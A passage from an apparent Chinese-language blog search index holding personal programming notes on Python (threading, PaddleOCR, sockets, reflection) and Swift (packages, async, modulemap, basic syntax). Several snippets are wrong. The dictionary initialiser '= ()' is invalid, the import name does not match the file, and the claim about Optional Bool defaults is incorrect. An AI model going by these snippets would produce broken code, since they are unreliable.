threading.Event() : 线程同步工具，用于线程间通信。它包含一个标志，可以通过set()和clear()方法设置或清除。当一个线程调用set()方法时，其他线程可以通过wait()方法等待该事件发生。 queue.Queue() : 线程安全的先进先出队列, 底层还是锁机制","tags":"后端","url":"/yq-doc-source-docs-rear-end-python-Concept-Multithreading.html","loc":"/yq-doc-source-docs-rear-end-python-Concept-Multithreading.html"},{"title":"OCR识别","text":"OCR (Optical Character Recognition), 光学字符识别 简单baidu了一下, 看到了一篇 几种python入门级OCR开源库中文识别效果对比 作者推荐使用 PaddleOCR 安装: pip install paddlepaddle shapely paddleocr 例: 演示图片: 代码: def ocr_with_paddle(img: str) -> list: from paddleocr import PaddleOCR, draw_ocr ocr_pad = PaddleOCR(use_angle_cls=True, lang=\"ch\") result = ocr_pad.ocr(img, cls=True) return result if __name__ == '__main__': _img = './img.png' r = ocr_with_paddle(_img) for x in r: for y in x: print(y) for x in r: for y in x: print(y[1][0]) 结果: [2023/03/16 11:34:21] ppocr DEBUG: Namespace(help='==SUPPRESS==', use_gpu=False, use_xpu=False, use_npu=False, ir_optim=True, use_tensorrt=False, min_subgraph_size=15, precision='fp32', gpu_mem=500, image_dir=None, page_num=0, det_algorithm='DB', det_model_dir='/Users/yanque/.paddleocr/whl/det/ch/ch_PP-OCRv3_det_infer', det_limit_side_len=960, det_limit_type='max', det_box_type='quad', det_db_thresh=0.3, det_db_box_thresh=0.6, det_db_unclip_ratio=1.5, max_batch_size=10, use_dilation=False, det_db_score_mode='fast', det_east_score_thresh=0.8, det_east_cover_thresh=0.1, det_east_nms_thresh=0.2, det_sast_score_thresh=0.5, det_sast_nms_thresh=0.2, det_pse_thresh=0, det_pse_box_thresh=0.85, det_pse_min_area=16, det_pse_scale=1, scales=[8, 16, 32], alpha=1.0, beta=1.0, fourier_degree=5, rec_algorithm='SVTR_LCNet', rec_model_dir='/Users/yanque/.paddleocr/whl/rec/ch/ch_PP-OCRv3_rec_infer', rec_image_inverse=True, rec_image_shape='3, 48, 320', rec_batch_num=6, max_text_length=25, rec_char_dict_path='/usr/local/lib/python3.9/site-packages/paddleocr/ppocr/utils/ppocr_keys_v1.txt', use_space_char=True, vis_font_path='./doc/fonts/simfang.ttf', drop_score=0.5, e2e_algorithm='PGNet', e2e_model_dir=None, e2e_limit_side_len=768, e2e_limit_type='max', e2e_pgnet_score_thresh=0.5, e2e_char_dict_path='./ppocr/utils/ic15_dict.txt', e2e_pgnet_valid_set='totaltext', e2e_pgnet_mode='fast', use_angle_cls=True, cls_model_dir='/Users/yanque/.paddleocr/whl/cls/ch_ppocr_mobile_v2.0_cls_infer', cls_image_shape='3, 48, 192', label_list=['0', '180'], cls_batch_num=6, cls_thresh=0.9, enable_mkldnn=False, cpu_threads=10, use_pdserving=False, warmup=False, sr_model_dir=None, sr_image_shape='3, 32, 128', sr_batch_num=1, draw_img_save_dir='./inference_results', save_crop_res=False, crop_res_save_dir='./output', use_mp=False, total_process_num=1, process_id=0, benchmark=False, save_log_path='./log_output/', show_log=True, use_onnx=False, output='./output', table_max_len=488, table_algorithm='TableAttn', table_model_dir=None, merge_no_span_structure=True, table_char_dict_path=None, layout_model_dir=None, layout_dict_path=None, layout_score_threshold=0.5, layout_nms_threshold=0.5, kie_algorithm='LayoutXLM', ser_model_dir=None, re_model_dir=None, use_visual_backbone=True, ser_dict_path='../train_data/XFUND/class_list_xfun.txt', ocr_order_method=None, mode='structure', image_orientation=False, layout=True, table=True, ocr=True, recovery=False, use_pdf2docx_api=False, lang='ch', det=True, rec=True, type='ocr', ocr_version='PP-OCRv3', structure_version='PP-StructureV2') [2023/03/16 11:34:22] ppocr DEBUG: dt_boxes num : 3, elapse : 0.06923604011535645 [2023/03/16 11:34:22] ppocr DEBUG: cls num : 3, elapse : 0.019355058670043945 [2023/03/16 11:34:24] ppocr DEBUG: rec_res num : 3, elapse : 1.6617558002471924 [[[12.0, 28.0], [254.0, 28.0], [254.0, 41.0], [12.0, 41.0]], ('时，一定要注意不能包裹while语句', 0.8965110778808594)] [[[11.0, 109.0], [32.0, 109.0], [32.0, 126.0], [11.0, 126.0]], ('例：', 0.9490082263946533)] 时，一定要注意不能包裹while语句 例： 注: 第一次使用时会下载一些包. 比如我的下载到了用户目录下的 .paddleocr 位置: yanque@yanquedembp docker % ls -lh ~/.paddleocr/whl/* /Users/yanque/.paddleocr/whl/cls: total 0 drwxr-xr-x@ 5 yanque staff 160B 3 16 11:30 ch_ppocr_mobile_v2.0_cls_infer /Users/yanque/.paddleocr/whl/det: total 0 drwxr-xr-x@ 3 yanque staff 96B 3 16 11:30 ch /Users/yanque/.paddleocr/whl/rec: total 0 drwxr-xr-x@ 3 yanque staff 96B 3 16 11:30 ch","tags":"后端","url":"/yq-doc-source-docs-rear-end-python-Related-technology-implementation-OCR-identification.html","loc":"/yq-doc-source-docs-rear-end-python-Related-technology-implementation-OCR-identification.html"},{"title":"Python网络编程","text":"Socket又称\"套接字\"，应用程序通常通过\"套接字\"向网络发出请求或者应答网络请求，使主机间或者进程间可以通讯。 Python 提供了两种服务模块: socket 底层网络接口, 提供了访问 BSD 套接字 的接口 socketserver 网络服务器框架, 简化网络服务器开发","tags":"后端","url":"/yq-doc-source-docs-rear-end-python-Tutorial-Python-network-programming.html","loc":"/yq-doc-source-docs-rear-end-python-Tutorial-Python-network-programming.html"},{"title":"使用python下载文件","text":"方式 requests wget urllib awscli & boto3","tags":"后端","url":"/yq-doc-source-docs-rear-end-python-Tutorial-Use-python-to-download-files.html","loc":"/yq-doc-source-docs-rear-end-python-Tutorial-Use-python-to-download-files.html"},{"title":"Python利用反射实例对象","text":"如果不局限于使用反射, 可以考虑使用 eval 函数, 此函数会将传入的字符串当作Python代码执行. 反射 反射(reflection)是一个编程语言的能力,允许程序在运行时检查和修改它自己的结构和行为。 如让程序在运行时发现和修改它自身的属性、方法的结构和动态地创建和执行。 反射主要具有以下几个功能: 自我检查:程序可以在运行时检查自身的结构,获取类、方法、属性的信息。 自我修改:程序在运行时可以修改自身的结构,添加、删除或者修改类、方法、属性。 动态加载:可以在运行时加载外部类和编译好的代码。 避免硬编码:通过反射可以避免将字符串、类名等硬编码在程序中。 通常,反射用于以下几个方面: 框架设计:通过反射实现动态加载类,避免硬编码类名,增强灵活性。 动态代理:通常使用反射生成代理类和代理方法。 ORM框架:通过反射读取类的属性与数据库字段对应。 IoC容器:通过反射动态实例化类,实现依赖注入。 动态编译器:通过反射生成动态类和方法。 使用importlib 见: /docs/后端/python/python标准库/importlib 如有一个model.py内容如下: class Person: def __init__(self, name): self.name = name 在main.py调用: import importlib module = importlib.import_module('module') c = getattr(module, 'Person') p = c('Jack') print(p.name) # Jack","tags":"后端","url":"/yq-doc-source-docs-rear-end-python-Tutorial-Use-reflex-instance-objects.html","loc":"/yq-doc-source-docs-rear-end-python-Tutorial-Use-reflex-instance-objects.html"},{"title":"Python重写父类方法参数列表问题","text":"介绍 使用 Pycharm 时, 当重写父类时, 若定义了不同的参数列表, 会出现警告. 这是因为: 由于增加了参数，从而改变了同父类方法的一致性违反了LSP原则（在使用父类的场景，替换为子类也一样可行）。 解决方式为，在子类重写的方法中为参数里添加默认值赋值，这样就确保了父类方法中定义的参数在子类中一定不会失效从而确保了自上而下的一致性。 只可新增参数, 同时设定默认值 源码","tags":"后端","url":"/yq-doc-source-docs-rear-end-python-conclusion-of-issue-Python-rewrite-the-parent-class-parameter-list-issues.html","loc":"/yq-doc-source-docs-rear-end-python-conclusion-of-issue-Python-rewrite-the-parent-class-parameter-list-issues.html"},{"title":"增加依赖","text":"方案一 - Xcode: 选择菜单栏的 File > Add Package Dependency , 然后输入仓库URL 参考: https://developer.apple.com/documentation/xcode/adding-package-dependencies-to-your-app 如果没找到的话(不知道为什么我就没有这个项), 就去项目的 General , 下拉找到 Frameworks, Libraries, and Embedded Content , 如图: 然后添加依赖即可 效果就是在根目录下增加一个 Package.resolved 文件: { \"pins\" : [ { \"identity\" : \"keyboardshortcuts\", \"kind\" : \"remoteSourceControl\", \"location\" : \"https://github.com/sindresorhus/KeyboardShortcuts.git\", \"state\" : { \"revision\" : \"c252200141e4abaecf30c14ea474dc009f56d553\", \"version\" : \"1.16.1\" } } ], \"version\" : 2 } 方案二 - 官方包(文件)管理器: 项目根创建 Package.swift 定义依赖项和版本 内容例(主要是两个 dependencies 以及 头部的版本定义): // swift-tools-version: 5.8 // The swift-tools-version declares the minimum version of Swift required to build this package. import PackageDescription let package = Package( name: \"CQ\", dependencies: [ // 指定 tag .package(url: \"https://github.com/sindresorhus/KeyboardShortcuts.git\", from: \"1.16.1\"), // 或者指定 branch // .package(url: \"https://github.com/sindresorhus/KeyboardShortcuts.git\", branch: \"main\") ], targets: [ // Targets are the basic building blocks of a package, defining a module or a test suite. // Targets can depend on other targets in this package and products from dependencies. .executableTarget( name: \"CQ\", dependencies: [ .product(name: \"KeyboardShortcuts\", package: \"keyboardshortcuts\") ], path: \"CQ\"), ] ) 定义好之后执行 swift build 即可 注解 Xcode编辑器可能会提示 PackageDescription 找不到 的报错, 忽略即可 创建发布可参考: https://www.jianshu.com/p/44560fd214d2 部分属性说明: name: 一般就是产品/项目名 dependencies: 依赖路径, 支持多种路径类型: git 源 + 确定的版本号 git 源 + 版本区间 git 源 + Commit 号 git 源 + 分支名 本地路径 targets: 目标, 可以有多个 targets.name: name targets.dependencies: 与上面的依赖不一样, 可以依赖上面 Package.Dependency 的东西或者依赖另一个 target。 所以这里只需要写 Package 或者 Target 的名字字符串（Target.Dependency 这个枚举也实现了 ExpressibleByStringLiteral）。 targets.path: target 的路径，默认为 [PackageRoot]/Sources/[TargetName] targets.source: 源文件路径，默认 TargetName 文件夹下都是源代码文件，会递归搜索 targets.exclude: 需要被排除在外的文件/文件夹，这些文件不会参与编译。 targets.publicHeadersPath: C 家族库的公共头文件地址。 targets.swiftSettings: 定义一个用于特定环境（例如 Debug）的宏，需要设置的话可以去 API 上研究下 targets.linkerSettings: 用于链接一些系统库 这个我失败了不知道为什么 方案三 - Pod管理器: 类似于Java的Maven","tags":"后端; swift","url":"/yq-backend-swift-add-depy.html","loc":"/yq-backend-swift-add-depy.html"},{"title":"Apple证书类型","text":"开发的设备要在其他设备上运行, 需要有证书 宏观来说有两种 Apple开发: 普通的带证书的本地开发, 直接使用自己账户登陆, 证书选择开发者, 就会默认生成一个可用的证书(免费, 有效期一年), 过期了再重复即可, Apple分发: 用于在其他设备运行, 发布到Apple Store, 个人账号688/y 参考: Apple官网-证书 Apple官网-证书类型","tags":"后端; swift","url":"/yq-backend-swift-apple-cert-type.html","loc":"/yq-backend-swift-apple-cert-type.html"},{"title":"Swift异步","text":"于Python类似, 高版本也支持使用async(await)来定义(调用)异步函数: func fetchData() async -> String { // 模拟异步操作，比如从网络获取数据 await Task.sleep(1_000_000_000) // 模拟1秒的延迟 return \"Data fetched successfully\" } 当在异步上下文中调用时, 除了直接await, 还可以: async { print(\"Async code block\") let result = try await someAsyncFunction() print(\"Result: \\(result)\") } 如果要在同步上下文中调用, 可以使用 Task 或者 Task.runDetached : Task.runDetached { print(\"Before calling asyncTask\") await asyncTask() print(\"After calling asyncTask\") } Task { print(\"Before calling asyncTask\") await asyncTask() print(\"After calling asyncTask\") } 两者区别在于它们的任务分离性和运行方式 任务分离性： Task.runDetached: 创建一个分离的任务，该任务不会等待其完成， 它会在后台执行，不会阻塞当前线程。 这意味着主线程或当前上下文中的代码可以继续执行而不等待任务完成。 Task: 在当前上下文中创建一个任务，它的行为类似于一个子任务。 如果你在一个任务中调用另一个任务，并使用 await 来等待它的完成， 那么它会在当前任务中被等待，不会分离执行 运行方式： Task.runDetached: 会创建一个新的任务，并在后台运行，不影响当前任务的执行。 这通常用于启动一个异步任务，而不需要等待它完成 Task: 在当前任务上下文中执行，如果使用 await 等待其完成， 它会被等待执行完成后再继续当前任务的执行","tags":"后端; swift","url":"/yq-backend-swift-course-async.html","loc":"/yq-backend-swift-course-async.html"},{"title":"常见属性包装器","text":"@State . @StateObject @StateObject属性包装器与类似@State，只不过它适用于ObservableObject。 一个ObservableObject始终是引用类型 (class)，并且每当其@Published属性之一发生更改时都会通知。 @Binding . @ObservedObject 以便视图可以观察外部对象的状态，并在重要内容发生变化时收到通知。 @Published 允许我们创建可观察的对象，并且在发生更改时触发视图重绘。我们经常将@Published与ObservableObject协议结合使用。 此部分可参考: https://juejin.cn/post/7319706549915156499","tags":"后端; swift","url":"/yq-backend-swift-course-attribute-wrapper.html","loc":"/yq-backend-swift-course-attribute-wrapper.html"},{"title":"swift-命令行-创建并运行项目","text":"官网: https://www.swift.org/getting-started/cli-swiftpm/ 平台: MacOS 以创建一个 Hello World 作为说明 项目创建与运行 创建项目: $ mkdir MyCLI $ cd MyCLI $ swift package init --name MyCLI --type executable 生成以下结构目录文件: . ├── Package.swift └── Sources └── main.swift 执行程序: $ swift run MyCLI Building for debugging... [3/3] Linking MyCLI Build complete! (0.68s) Hello, world!","tags":"后端; swift","url":"/yq-backend-swift-course-create-pro.html","loc":"/yq-backend-swift-course-create-pro.html"},{"title":"DEBUG条件","text":"用于设置如果是开发(DEBUG)中该做什么, 正式环境该做什么, 如: #if DEBUG print(\"可能没有获取到辅助权限, 确认后请清理后手动获取\") #else // 打开请求辅助权限窗口 let _ = NoAccessView().openInWindow(title: \"请求授权\", sender: self) #endif 如何配置? 打开, 程序配置页面, 选择 Build Settings , 然后可以在 Filter 中 搜索 Custom Flags 如图所示, 还需在 Other Swift Flags 中 设置 Debug 添加 -D DEBUG , 注意不要和Release一起添加","tags":"后端; swift","url":"/yq-backend-swift-course-debug.html","loc":"/yq-backend-swift-course-debug.html"},{"title":"事件类型","text":"HID 事件和会话事件 HID 事件（Human Interface Device Events） HID 事件是指由人机交互设备（如键盘、鼠标、触摸板等）产生的事件。 用途：通过截取 HID 事件，你可以监视和响应用户与输入设备的交互，例如按键、点击、滚动等操作。 会话事件（Session Events）： 会话事件是指与用户登录会话（session）相关的事件，如用户登录、注销、屏幕锁定等。 用途：会话事件主要用于监视和响应用户登录和注销等会话级别的操作，以便执行与会话状态相关的任务或逻辑。 区别： HID 事件是与人机交互设备（输入设备）相关的事件，而会话事件是与用户登录会话（session）相关的事件。 HID 事件是针对用户输入的响应，而会话事件是针对用户登录和注销等会话级别的操作的响应。 HID 事件可以截取和处理，以实现自定义的交互逻辑，而会话事件通常由系统或框架处理。","tags":"后端; swift","url":"/yq-backend-swift-course-event-type.html","loc":"/yq-backend-swift-course-event-type.html"},{"title":"桥接导入C","text":"注解 源于AI, 有空整理 如果你在 Swift 中使用桥接头文件来访问 C 头文件中的宏定义，你可以按照以下步骤进行操作： 创建桥接头文件 在 Xcode 中，创建一个新的头文件（例如 YourProject-Bridging-Header.h）。 在桥接头文件中，使用 #import 或 #include 导入 libproc.h 头文件: #import <libproc.h> 配置桥接头文件： 在 Xcode 项目的 \"Build Settings\"（构建设置）中， 找到 \"Objective-C Bridging Header\"（Objective-C 桥接头文件）设置。 将设置的值指定为桥接头文件的路径，例如 YourProject/YourProject-Bridging-Header.h。 在 Swift 代码中使用宏定义 在 Swift 文件中，你可以通过桥接头文件来访问 libproc.h 中的宏定义。 使用 #if 预处理指令来检查宏定义的值，并在代码中做出相应的处理: #if YOUR_MACRO // 宏定义存在时的处理逻辑 #else // 宏定义不存在时的处理逻辑 #endif 请注意，Swift 是一种不同于 C 的语言，因此在 Swift 文件中无法直接访问 C 头文件中的宏定义。 通过桥接头文件，你可以在 Objective-C 和 Swift 之间建立连接，从而使 Swift 代码能够访问 C 头文件中的宏定义和其他内容。 确保在桥接头文件和 Swift 文件之间设置了正确的路径和配置，以便能够成功访问 libproc.h 中的宏定义","tags":"后端; swift","url":"/yq-backend-swift-course-import-c.html","loc":"/yq-backend-swift-course-import-c.html"},{"title":"使用modulemap导入C++框架","text":"自己使用modulemap只导入某一个头文件, 文件是位于SDK库的 libproc.h , 奈何一直失败, 故放弃.... 贴一些相关的资料: Importing Headers from a C++ Package Target Mixing Languages in an Xcode project Importing C++ into Swift 反正是看了一圈, 好像没直接支持的, 如果要拿出来弄成target或者框架啥的, 就好麻烦, 毕竟只需要导那一个..., 暂时先桥接处理吧 使用modulemap 大致两步流程 编写 modulemap 文件, 命名为 module.modulemap (在xcode新建会自带后缀) 在 TARGETS 下配置 Swift Compiler - Search Paths 为modulemap文件所在目录 详细说明 modulemap 不止可以使用在 C++, 也可以是C, 也不止是包和框架, 还可以直接在当前项目内直接新拉一个组用, 但是最重要的一点, 文件名只能定义为 `module` 另外需配置 Swift Compiler - Search Paths 为modulemap文件所在目录, 以根目录下 Modules/module.modulemap 为例 (且一定要选 TARGETS 而不是 PROJECT ): $(SRCROOT)/Modules 重要 modulemap文件名只能叫 module module.modulemap内容示例: module ProcInfo { header \"tt.h\" export * } 其他说明 有个新的问题, 就是在自定义的头文件, 无法导入其他头文件并正常使用, 以导入SDK库的libproc为例: // tt.h #ifndef tt_h #define tt_h //#include <libproc.h> //#import <libproc.h> #import </Applications/Xcode.app/Contents/Developer/Platforms/MacOSX.platform/Developer/SDKs/MacOSX14.2.sdk/usr/include/libproc.h> // 不知道为啥, 就是找不到sdk包里面的 libproc... #define NAME \"YQ\" #define NAME2 \"YQ\" #define PROC_PIDPATHINFO_MAXSIZE PROC_PIDPATHINFO_MAXSIZE #define PROC_Q_MAXSIZE PROC_PIDPATHINFO_MAXSIZE #define SIZEYQ \"PROC_PIDPATHINFO_MAXSIZE\" #endif /* tt_h */ 不管 import 怎么写, 不管在 header path怎么设置, 哪怕是直接导入绝对路径, cmd + click 都找不到... 最后尝试了一下在swift中使用, 发现一个问题, 就是虽然头文件中没发直接按住Command键并单击来导航到导入的头文件, 但是代码中可以拿到部分值 注解 无法通过 按住Command键并单击来 自定义头文件中引入的头文件来确定是否成功导入, 貌似根本没发在项目支持.","tags":"后端; swift","url":"/yq-backend-swift-course-import-cframe.html","loc":"/yq-backend-swift-course-import-cframe.html"},{"title":"基本语法","text":"常识了解 Swift Playground 可视为一个可交互的文档， 所写即所得 内置关键字 let 常量定义 var 变量定义 print 打印输出 typealias 定义类型别名 如定义了 Int 的类型别名为 Feet: typealias Feet = Int guard guard语句和if语句有点类似，都是根据其关键字之后的表达式的布尔值决定下一步执行什么。 但与if语句不同的是，guard语句只会有一个代码块，不像if语句可以if else多个代码块。 那么guard语句的作用到底是什么呢？顾名思义，就是守护。 guard语句判断其后的表达式布尔值为false时，才会执行之后代码块里的代码， 如果为true，则跳过整个guard语句: // 检查身份证，如果身份证没带，则不能进入考场 guard let id = person[\"id\"] else { print(\"没有身份证，不能进入考场!\") return } 内置数据类型 Int 整型 UInt 无符号整型 尽量不要使用UInt，除非你真的需要存储一个和当前平台原生字长相同的无符号整数。 除了这种情况，最好使用Int，即使你要存储的值已知是非负的。 统一使用Int可以提高代码的可复用性，避免不同类型数字之间的转换，并且匹配数字的类型推断。 注解 整数类型需要注意以下几点： 在 32 位系统上, Int 和 Int32 长度相同。 在 64 位系统上, Int 和 Int64 长度相同。 在 32 位系统上, UInt 和 UInt32 长度相同。 在 64 位系统上, UInt 和 UInt64 长度相同。 Int8, Int16, Int32, Int64 分别表示 8 位, 16 位, 32 位, 和 64 位的有符号整数形式。 UInt8, UInt16, UInt32, UInt64 分别表示 8 位, 16 位, 32 位 和 64 位的无符号整数形式。 Float 32浮点数，精度要求不高的话可以使用此类型。 浮点类型比整数类型表示的范围更大，可以存储比 Int 类型更大或者更小的数字 Double 64位浮点数，当你需要存储很大或者很高精度的浮点数时请使用此类型。 注解 Double精确度很高，至少有15位数字， 而 Float 最少只有6位数字。 选择哪个类型取决于你的代码需要处理的值的范围。 Bool 布尔值 基本的布尔（Boolean）类型，叫做 Bool。布尔值指逻辑上的值，因为它们只能是真或者假。 Swift 有两个布尔常量，true 和 false。 String 字符串是字符的序列集合 Character 字符指的是单个字母 Optional 使用可选类型来处理值可能缺失的情况。可选类型表示有值或没有值。 如以下两种声明相等: var optionalInteger: Int? var optionalInteger: Optional<Int> 当你声明一个可选变量或者可选属性的时候没有提供初始值，它的值会默认为 nil 若为布尔， 貌似默认为true 如果一个可选类型的实例包含一个值，你可以用后缀操作符 ！来访问这个值: optionalInteger = 42 optionalInteger! // 42 当你确定可选类型确实包含值之后，你可以在可选的名字后面加一个感叹号（!）来获取值， 这被称为可选值的 强制解析（forced unwrapping） 这部分(问号/叹号)的使用, 与ts基本一致 注解 使用!来获取一个不存在的可选值会导致运行时错误。 使用!来强制解析值之前，一定要确定可选包含一个非nil的值。 可选绑定 使用可选绑定（optional binding）来判断可选类型是否包含值， 如果包含就把值赋给一个临时常量或者变量。 可选绑定可以用在if和while语句中来对可选类型的值进行判断并把值赋给一个常量或者变量。 实例: import Cocoa var myString:String? myString = \"Hello, Swift!\" if let yourString = myString { print(\"你的字符串值为 - \\(yourString)\") }else{ print(\"你的字符串没有值\") } 以上程序执行结果为: 你的字符串值为 - Hello, Swift! Array todo Dictionary todo Struct todo Class todo 类型安全 Swift 是一个类型安全（type safe）的语言。 由于 Swift 是类型安全的， 所以它会在编译你的代码时进行类型检查（type checks），并把不匹配的类型标记为错误。 这可以让你在开发的时候尽早发现并修复错误。 类型推断 不需要每次声明常量和变量的时候都显式指定类型 如果你没有显式指定类型，Swift 会使用类型推断（type inference）来选择合适的类型。 当推断浮点数的类型时，Swift 总是会选择Double而不是Float。 如果表达式中同时出现了整数和浮点数，会被推断为Double类型 Swift 变量 变量是一种使用方便的占位符，用于引用计算机内存地址。 声明: var variableName = <initial value> var varB:Float 变量名可以由字母，数字和下划线组成 变量名需要以字母或下划线开始 区分大小写 Swift 常量 设定后不可变 声明常量或者变量的时候可以加上类型标注（type annotation）， 说明常量或者变量中要存储的值的类型: var constantName:<data type> = <optional initial value> Swift 运算符 算术运算符 + - * / % , 分别表示 加 减 乘 除 求余 比较运算符 == 等于 != 不等于 > 大于 < 小于 >= 大于等于 <= 小于等于 逻辑运算符 && 逻辑与。如果运算符两侧都为 TRUE 则为 TRUE。 || 逻辑或。 如果运算符两侧至少有一个为 TRUE 则为 TRUE。 ! 逻辑非。布尔值取反，使得true变false，false变true。 位运算符 位运算符用来对二进制位进行操作， ~ & | &#94; << >> 分别为取反，按位与与，按位与或，按位与异或运算, 按位左移， 按位右移 赋值运算符 = 简单的赋值运算，指定右边操作数赋值给左边的操作数 += 相加后再赋值，将左右两边的操作数相加后再赋值给左边的操作数。 -= 相减后再赋值，将左右两边的操作数相减后再赋值给左边的操作数。 *= 相乘后再赋值，将左右两边的操作数相乘后再赋值给左边的操作数。 /= 相除后再赋值，将左右两边的操作数相除后再赋值给左边的操作数 %= 求余后再赋值，将左右两边的操作数求余后再赋值给左边的操作数 <<= 按位左移后再赋值 >>= 按位右移后再赋值 &= 按位与运算后赋值 &#94;= 按位异或运算符后再赋值 |= 按位或运算后再赋值 区间运算符 闭区间运算符: 闭区间运算符 （a...b） 定义一个包含从a到b(包括a和b)的所有值的区间, 必须大于等于a。 闭区间运算符在迭代一个区间的所有值时是非常有用的， 如在for-in循环中: 1...5 区间值为 1, 2, 3, 4 和 5 半开区间运算符 半开区间（a..<b）定义一个从a到b但不包括b的区间。 之所以称为半开区间， 是因为该区间包含第一个值而不包括最后的值。 如： 1..< 5 区间值为 1, 2, 3, 和 4 其他运算符 其他类型的的运算符，如一元、二元和三元运算符 一元减: 数字前添加 - 号前缀, -3 或 -4 一元加: 数字前添加 + 号前缀, +6 结果为 6 三元运算符: condition ? X : Y, 如果 condition 为 true ，值为 X ，否则为 Y 重要 运算符优先级 优先级从上到下依次递减，最上面具有最高的优先级，逗号操作符具有最低的优先级。 相同优先级中，按结合顺序计算。大多数运算是从左至右计算，只有三个优先级是从右至左结合的， 它们是单目运算符、条件运算符、赋值运算符。 基本的优先级需要记住： 指针最优，单目运算优于双目运算。如正负号。 先乘除（模），后加减。 先算术运算，后移位运算，最后位运算。 特别注意： 1 << 3 + 2 & 7 等价于 (1 << (3 + 2))&7 逻辑运算最后计算 合并空值运算符：?? 合并空值运算符 a ?? b 如果可选项 a 有值则展开，如果没有值，是 nil，则返回默认值 b。 表达式 a 必须是一个可选类型，表达式 b 必须与 a 的存储类型相同 合并空值运算符，实际上是三元运算符作用到 Optional 上的缩写 a != nil ? a! : b 如果 a 的值是非空，b的值将不会被考虑，也就是合并空值运算符是短路的。 Swift 条件语句 if switch 最简便的就是三目: Exp1 ? Exp2 : Exp3; Swift 循环 for-in 遍历一个集合里面的所有元素，例如由数字表示的区间、数组中的元素、字符串中的字符。 for 循环 该循环方式在 Swift 3 中已经弃用。 用来重复执行一系列语句直到达成特定条件达成， 一般通过在每次循环完成后增加计数器的值来实现。 while 循环 运行一系列语句，如果条件为true，会重复运行，直到条件变为false。 repeat...while 循环 类似 while 语句区别在于判断循环条件之前，先执行一次循环的代码块。 循环控制语句 continue 语句: 告诉一个循环体立刻停止本次循环迭代，重新开始下次循环迭代。 break 语句: 中断当前循环。 fallthrough 语句: 如果在一个case执行完后，继续执行下面的case， 需要使用fallthrough(贯穿)关键字。 Swift 字符串 创建 可以通过使用字符串字面量或 String 类的实例来创建一个字符串: import Cocoa // 使用字符串字面量 var stringA = \"Hello, World!\" print( stringA ) // String 实例化 var stringB = String(\"Hello, World!\") print( stringB ) 初始化空的字符串 可以使用空的字符串字面量赋值给变量或初始化一个String类的实例来初始值一个空的字符串, 使用字符串属性 isEmpty 来判断字符串是否为空: import Cocoa // 使用字符串字面量创建空字符串 var stringA = \"\" // 实例化 String 类来创建空字符串 // let stringB = String() if stringA.isEmpty { print( \"stringA 是空的\" ) } else { print( \"stringA 不是空的\" ) 字符串中插入值 插入的字符串字面量的每一项都在以反斜线为前缀的圆括号中: import Cocoa var varA = 20 let constA = 100 var varC:Float = 20.0 var stringA = \"\\(varA) 乘于 \\(constA) 等于 \\(varC * 100)\" print( stringA ) 字符串连接 字符串可以通过 + 号来连接 字符串长度 字符串长度使用 String.count 属性来计算 字符串比较 使用 == 来比较两个字符串是否相等 Unicode 字符串 Unicode 是一个国际标准，用于文本的编码，Swift 的 String 类型是基于 Unicode建立的。 你可以循环迭代出字符串中 UTF-8 与 UTF-16 的编码: import Cocoa var unicodeString = \"菜鸟教程\" print(\"UTF-8 编码: \") for code in unicodeString.utf8 { print(\"\\(code) \") } print(\"\\n\") print(\"UTF-16 编码: \") for code in unicodeString.utf16 { print(\"\\(code) \") } 字符串函数及运算符 isEmpty: 判断字符串是否为空，返回布尔值 hasPrefix(prefix: String): 检查字符串是否拥有特定前缀 hasSuffix(suffix: String): 检查字符串是否拥有特定后缀。 Int(String): 转换字符串数字为整型 String.count: Swift 3 版本使用的是 String.characters.count, 计算字符串的长度 utf8: 您可以通过遍历 String 的 utf8 属性来访问它的 UTF-8 编码 utf16: 您可以通过遍历 String 的 utf16 属性来访问它的 utf16 编码 unicodeScalars: 您可以通过遍历String值的unicodeScalars属性来访问它的 Unicode 标量编码. +: 连接两个字符串，并返回一个新的字符串 +=: 连接操作符两边的字符串并将新字符串赋值给左边的操作符变量 ==: 判断两个字符串是否相等 <: 比较两个字符串，对两个字符串的字母逐一比较。 !=: 比较两个字符串是否不相等。 Swift 字符(Character) 空字符变量 Swift 中不能创建空的 Character（字符） 类型变量或常量 遍历字符串中的字符 Swift 3 中的 String 需要通过 characters 去调用的属性方法， 在 Swift 4 中可以通过 String 对象本身直接调用，例如: import Cocoa for ch in \"Runoob\" { print(ch) } 字符串连接字符 使用 String 的 append() 方法来实现字符串连接字符 Swift 数组 如果创建一个数组，并赋值给一个变量，则创建的集合就是可以修改的。这意味着在创建数组后，可以通过添加、删除、修改的方式改变数组里的项目。 如果将一个数组赋值给常量，数组就不可更改，并且数组的大小和内容都不可以修改。 创建数组 可以使用构造语法来创建一个由特定数据类型构成的空数组： var someArray = [SomeType]() 以下是创建一个初始化大小数组的语法: var someArray = [SomeType](repeating: InitialValue, count: NumbeOfElements) 以下实例创建了一个类型为 Int ，数量为 3，初始值为 0 的空数组: var someInts = [Int](repeating: 0, count: 3) 以下实例创建了含有三个元素的数组: var someInts:[Int] = [10, 20, 30] 访问数组 根据数组的索引来访问数组的元素，语法如下: var someVar = someArray[index] 修改数组 可以使用 append() 方法或者赋值运算符 += 在数组末尾添加元素 也可以通过索引修改数组元素的值 遍历数组 可以使用for-in循环来遍历所有数组中的数据项 合并数组 可以使用加法操作符（+）来合并两种已存在的相同类型数组 count 属性 使用 count 属性来计算数组元素个数 isEmpty 属性 通过只读属性 isEmpty 来判断数组是否为空 注解 创建数组的方法 推荐: var names: [String] = [] var lookup: [String: Int] = [:] 不推荐: var names = [String]() var lookup = [String: Int]() Swift 字典 Swift 字典用来存储无序的相同类型数据的集合，Swift 字典会强制检测元素的类型，如果类型不同则会报错。 Swift 字典每个值（value）都关联唯一的键（key），键作为字典中的这个值数据的标识符 如果创建一个字典，并赋值给一个变量，则创建的字典就是可以修改的。这意味着在创建字典后，可以通过添加、删除、修改的方式改变字典里的项目。 如果将一个字典赋值给常量，字典就不可修改，并且字典的大小和内容都不可以修改。 创建字典 可以使用以下语法来创建一个特定类型的空字典: // var someDict = [KeyType: ValueType]() var someDict: [KeyType: ValueType] = () 以下是创建一个空字典，键的类型为 Int，值的类型为 String 的简单语法: // var someDict = [Int: String]() var someDict: [Int: String] = () 以下为创建一个字典的实例: var someDict:[Int:String] = [1:\"One\", 2:\"Two\", 3:\"Three\"] 访问字典 我们可以根据字典的索引来访问数组的元素，语法如下: var someVar = someDict[key] 修改字典 可以使用 updateValue(forKey:) 增加或更新字典的内容。 如果 key 不存在，则添加值，如果存在则修改 key 对应的值。 updateValue(_:forKey:)方法返回被修改的Optional值 也可以通过指定的 key 来修改字典的值 移除 Key-Value 对 可以使用 